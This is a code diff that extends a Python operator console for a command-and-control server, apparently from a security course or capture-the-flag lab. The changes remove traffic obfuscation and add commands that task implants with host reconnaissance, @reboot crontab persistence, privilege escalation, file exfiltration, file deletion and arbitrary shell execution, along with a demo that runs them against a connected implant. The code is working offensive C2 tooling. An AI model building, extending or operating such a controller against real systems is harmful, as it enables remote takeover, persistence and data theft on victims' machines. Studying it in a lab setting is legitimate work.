@@ -9,16 +9,9 @@ C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
 C2_OPERATOR_PORT = int(os.environ.get("C2_OPERATOR_PORT", "9998"))
 C2_TOKEN = os.environ.get("OPERATOR_TOKEN", "changeme")
 
-_KEY = b"cs564"
-
-
-def _xor(data):
-    return bytes(b ^ _KEY[i % len(_KEY)] for i, b in enumerate(data))
-
 
 def _send(conn, data):
-    enc = _xor(data)
-    conn.sendall(struct.pack(">I", len(enc)) + enc)
+    conn.sendall(struct.pack(">I", len(data)) + data)
 
 
 def _recv(conn):
@@ -35,7 +28,7 @@ def _recv(conn):
         if not c:
             raise ConnectionError("closed")
         buf += c
-    return _xor(buf)
+    return buf
 
 
 def _tx(sock, msg):
@@ -48,11 +41,46 @@ Commands:
   list
   task <ID> RUN_CMD <shell command>
   task <ID> SYSINFO
-  task <ID> EXFIL_FILE <remote path>
+  task <ID> RECON_BUNDLE            — full host recon (multi-step)
+  task <ID> PERSIST                 — install @reboot crontab (multi-step)
+  task <ID> PRIVESC                 — enumerate + attempt privilege escalation (multi-step)
+  task <ID> EXFIL_FILE <path>
+  task <ID> READ_DATA <key>
+  task <ID> WRITE_DATA <key> <value>
+  task <ID> DELETE_FILE <path>
   task <ID> HEARTBEAT
   task <ID> SHUTDOWN
   quit / exit
 """
+
+
+def _print_result(resp):
+    status = resp.get("status")
+    if status == "error":
+        print("  ERROR: {0}".format(resp.get("message", resp)))
+        return
+    result = resp.get("result", {})
+    payload = result.get("payload", {})
+
+    if "stdout" in payload:
+        print("  stdout:     {0}".format(payload["stdout"] or "(empty)"))
+        if payload.get("stderr"):
+            print("  stderr:     {0}".format(payload["stderr"]))
+        print("  returncode: {0}".format(payload.get("returncode")))
+    elif "value" in payload:
+        print("  value: {0}".format(payload["value"]))
+    elif isinstance(payload, dict) and len(payload) > 3:
+        # multi-key payload (RECON_BUNDLE, PERSIST, PRIVESC, SYSINFO)
+        for k, v in payload.items():
+            v_str = str(v)
+            # truncate long values to avoid flooding the terminal
+            if len(v_str) > 200:
+                v_str = v_str[:200] + "... (truncated)"
+            print("  {0:<20} {1}".format(k + ":", v_str))
+    elif "message" in payload:
+        print("  {0}".format(payload["message"]))
+    else:
+        print(json.dumps(payload, indent=2))
 
 
 def _interactive(sock):
@@ -70,7 +98,10 @@ def _interactive(sock):
         parts = line.split(None, 1)
         verb = parts[0].lower()
 
-        if verb == "list":
+        if verb in ("help", "?"):
+            print(_HELP.strip())
+
+        elif verb == "list":
             resp = _tx(sock, {"action": "LIST"})
             implants = resp.get("implants", {})
             if not implants:
@@ -93,102 +124,115 @@ def _interactive(sock):
                 payload = {"cmd": args}
             elif c2_cmd == "EXFIL_FILE":
                 payload = {"path": args}
-            elif c2_cmd in ("HEARTBEAT", "SYSINFO", "SHUTDOWN"):
+            elif c2_cmd == "READ_DATA":
+                payload = {"key": args}
+            elif c2_cmd == "WRITE_DATA":
+                kv = args.split(None, 1)
+                payload = {"key": kv[0], "value": kv[1] if len(kv) > 1 else ""}
+            elif c2_cmd == "DELETE_FILE":
+                payload = {"path": args}
+            elif c2_cmd in ("HEARTBEAT", "SYSINFO", "SHUTDOWN",
+                            "RECON_BUNDLE", "PERSIST", "PRIVESC"):
                 payload = {}
             else:
                 print("  Unknown command: {0}".format(c2_cmd))
                 continue
 
-            resp = _tx(
-                sock,
-                {
-                    "action": "TASK",
-                    "target": target,
-                    "command": c2_cmd,
-                    "payload": payload,
-                },
-            )
+            resp = _tx(sock, {"action": "TASK", "target": target, "command": c2_cmd, "payload": payload})
             _print_result(resp)
 
         else:
             print("  Unknown: {0!r}".format(verb))
 
 
-def _print_result(resp):
-    status = resp.get("status")
-    if status == "error":
-        print("  ERROR: {0}".format(resp.get("message", resp)))
-        return
-    result = resp.get("result", {})
-    payload = result.get("payload", {})
-    if "stdout" in payload:
-        print("  stdout:     {0}".format(payload["stdout"] or "(empty)"))
-        if payload.get("stderr"):
-            print("  stderr:     {0}".format(payload["stderr"]))
-        print("  returncode: {0}".format(payload.get("returncode")))
-    elif "message" in payload:
-        print("  {0}".format(payload["message"]))
-    else:
-        print(json.dumps(payload, indent=2))
-
-
 def _demo(sock):
-    sep = "=" * 60
-    print("\n{0}".format(sep))
-    print("  OPERATOR DEMO")
-    print(sep)
+    print("OPERATOR DEMO\n")
 
     resp = _tx(sock, {"action": "LIST"})
     implants = list(resp.get("implants", {}).keys())
-    print("\n[LIST] {0}".format(implants))
+    print("[LIST] {0}".format(implants))
 
     if not implants:
-        print("  No implants connected.")
+        print("No implants connected.")
         return
 
     t = implants[0]
-    print("  Targeting: {0}\n".format(t))
+    print("Targeting: {0}\n".format(t))
 
     tasks = [
-        ("HEARTBEAT", {}),
-        ("SYSINFO", {}),
-        ("RUN_CMD", {"cmd": "whoami"}),
-        ("RUN_CMD", {"cmd": "hostname"}),
-        ("RUN_CMD", {"cmd": "id"}),
-        ("EXFIL_FILE", {"path": "/etc/hostname"}),
+        ("HEARTBEAT",     {}),
+        ("SYSINFO",       {}),
+        ("RUN_CMD",       {"cmd": "whoami && id"}),
+        ("RECON_BUNDLE",  {}),
+        ("PERSIST",       {}),
+        ("PRIVESC",       {}),
+        ("WRITE_DATA",    {"key": "flag", "value": "CTF{c2_beacon_success}"}),
+        ("READ_DATA",     {"key": "flag"}),
+        ("EXFIL_FILE",    {"path": "/etc/hostname"}),
     ]
 
     for command, payload in tasks:
         try:
-            resp = _tx(
-                sock,
-                {"action": "TASK", "target": t, "command": command, "payload": payload},
-            )
+            resp = _tx(sock, {"action": "TASK", "target": t, "command": command, "payload": payload})
             result = resp.get("result", {}).get("payload", {})
-            summary = result.get("stdout") or result.get("message") or str(result)
-            print("  [{0:<14}]  {1}".format(command, str(summary)[:80]))
+            # summarize result to one line for demo output
+            summary = (
+                result.get("stdout")
+                or result.get("value")
+                or result.get("message")
+                or result.get("escalation")
+                or result.get("crontab")
+                or str(result)
+            )
+            print("  [{0:<14}]  {1}".format(command, str(summary)[:100]))
         except Exception as exc:
             print("  [{0:<14}]  ERROR: {1}".format(command, exc))
 
-    print("\n{0}".format(sep))
-    print("  DEMO COMPLETE")
-    print("{0}\n".format(sep))
+    print("\nDemo complete.")
+
+
+def _connect():
+    import time
+    warned = False
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((C2_HOST, C2_OPERATOR_PORT))
+            resp = _tx(sock, {"action": "AUTH", "token": C2_TOKEN})
+            if resp.get("status") != "ok":
+                print("[OPERATOR] Auth failed: {0}".format(resp.get("message")))
+                sock.close()
+                return None
+            print("[OPERATOR] Authenticated.\n")
+            return sock
+        except (ConnectionRefusedError, OSError) as exc:
+            if not warned:
+                print("[OPERATOR] Waiting for C2 server...")
+                warned = True
+            time.sleep(3)
 
 
 def main():
     mode = sys.argv[1] if len(sys.argv) > 1 else "interactive"
-    print("[op] connecting to {0}:{1}...".format(C2_HOST, C2_OPERATOR_PORT))
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        sock.connect((C2_HOST, C2_OPERATOR_PORT))
-        resp = _tx(sock, {"action": "AUTH", "token": C2_TOKEN})
-        if resp.get("status") != "ok":
-            print("[op] auth failed: {0}".format(resp.get("message")))
+    print("[OPERATOR] Connecting to {0}:{1}...".format(C2_HOST, C2_OPERATOR_PORT))
+
+    if mode == "demo":
+        sock = _connect()
+        if sock:
+            with sock:
+                _demo(sock)
+        return
+
+    while True:
+        sock = _connect()
+        if sock is None:
             return
-        print("[op] authenticated.\n")
-        if mode == "demo":
-            _demo(sock)
-        else:
-            _interactive(sock)
+        try:
+            with sock:
+                _interactive(sock)
+                return  # user typed quit/exit
+        except (ConnectionError, OSError) as exc:
+            print("\n[OPERATOR] Disconnected: {0} — reconnecting...".format(exc))
 
 
 if __name__ == "__main__":
